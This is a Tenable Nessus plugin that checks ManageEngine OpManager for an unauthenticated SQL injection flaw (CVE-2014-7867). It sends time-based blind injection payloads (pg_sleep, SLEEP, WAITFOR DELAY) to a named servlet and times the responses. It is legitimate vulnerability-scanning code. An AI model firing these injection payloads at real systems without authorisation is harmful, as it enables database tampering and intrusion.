#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(81381);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/02/17 14:16:17 $");

  script_cve_id("CVE-2014-7867");
  script_osvdb_id(115806);
  script_bugtraq_id(71509);

  script_name(english:"ManageEngine OpManager 'probeName' SQL Injection Vulnerability");
  script_summary(english:"Attempts to exploit the flaw.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web application affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of ManageEngine OpManager that is
affected by a SQL injection vulnerability due to a failure to validate
the 'probeName' parameter of the UpdateProbeUpgradeStatus servlet. A
remote, unauthenticated attacker can exploit this to modify the
application's database and potentially gain administrative rights.");
  # https://support.zoho.com/portal/manageengine/helpcenter/articles/sql-injection-vulnerability-fix
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?29582d4f");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine OpManager 11.3 or 11.4 and apply the vendor
issued security patch, or upgrade to a version later than 11.4.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/08/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/02/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_opmanager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("manageengine_opmanager_detect.nbin");
  script_require_keys("installed_sw/ManageEngine OpManager");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("install_func.inc");
include("http.inc");
include("url_func.inc");

appname = "ManageEngine OpManager";
# Stops get_http_port from branching
get_install_count(app_name:appname, exit_if_zero:TRUE);

port     = get_http_port(default:80);
install  = get_single_install(app_name:appname,port:port); # Can be launched against unknown version
url      = build_url(port:port,qs:install['path']);
item     = "/servlet/DataComparisonServlet";
postdat  = "operation=compare&numPrimaryKey="+rand_str(charset:"123456789",length:6)+"&query=";
variance = 4; # Variance allowed in response time
timings  = make_list(15,20); # Seconds to sleep for test
cmds     = make_list( # To figure out what the db backend is
  "SELECT+pg_sleep(%TIMING%)",     # Postgres
  "SELECT+SLEEP(%TIMING%)",        # MySQL
  "WAITFOR+DELAY+'00:00:%TIMING%'" # SQL Server
);

requests  = make_list();
output    = NULL;
timing    = 10;
# Find out which db backend we're using
foreach cmd (cmds)
{
  http_set_read_timeout(timing*2);
  then = unixtime();
  res  = http_send_recv3(
    method       : "POST",
    item         : item,
    add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
    data         : postdat+ereg_replace(pattern:"%TIMING%",replace:timing,string:cmd),
    port         : port,
    exit_on_fail : TRUE
  );
  now = unixtime();
  # Found back-end
  delta = now-then;
  if(delta >= timing && delta < timing+variance)
  {
    postdat += cmd;
    requests = make_list(requests,  http_last_sent_request());
    output  += res[0]+'(Response was delayed by '+delta+' seconds)\n';
    break;
  }
}

# First test failed
if(empty_or_null(requests))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, url);

# Try 2 more timings to confirm
foreach timing (timings)
{
  http_set_read_timeout(timing*2);
  then = unixtime();
  res  = http_send_recv3(
    method       : "POST",
    item         : item,
    add_headers  : make_array("Content-Type","application/x-www-form-urlencoded"),
    data         : ereg_replace(pattern:"%TIMING%",replace:timing,string:postdat),
    port         : port,
    exit_on_fail : TRUE
  );
  now = unixtime();

  # Test failed
  delta = now-then;
  if(delta < timing || delta > timing+variance)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, url);

  # Test passed
  requests  = make_list(requests,  http_last_sent_request());
  output   += res[0]+'(Response was delayed by '+delta+' seconds)\n';
}

# If we make it here all 3 tests passed
security_report_v4(
  port     : port,
  sqli     : TRUE,
  request  : requests,
  output   : chomp(output),
  severity : SECURITY_HOLE,
  generic  : TRUE
);
